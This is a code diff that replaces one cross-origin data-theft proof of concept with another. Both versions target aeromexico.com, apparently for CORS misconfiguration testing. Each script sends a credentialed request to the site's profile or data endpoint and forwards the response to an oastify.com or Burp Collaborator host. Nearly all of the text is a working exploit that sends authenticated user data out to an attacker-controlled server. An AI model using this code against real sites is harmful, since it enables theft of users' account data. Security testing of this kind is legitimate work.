@@ -1,9 +1,22 @@
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://aeromexico.com//api/v4/profile/user-profile',true); 
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-    location='//punyfjxupex0amn8gc43h3ikgbm2ax3ls.oastify.com/log?key='+this.responseText; 
-};
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <script type="text/javascript">
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://www.aeromexico.com/sensitive-data', true);
+        xhr.withCredentials = true;
+        xhr.setRequestHeader('Origin', 'http://mi8v3glrdblxyjb549s0506h48azystgi.oastify.com');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                var data = xhr.responseText;
+                var img = new Image();
+                img.src = 'http://<your-collaborator-subdomain>.burpcollaborator.net/log?data=' + encodeURIComponent(data);
+            }
+        };
+        xhr.send();
+    </script>
+</body>
+</html>
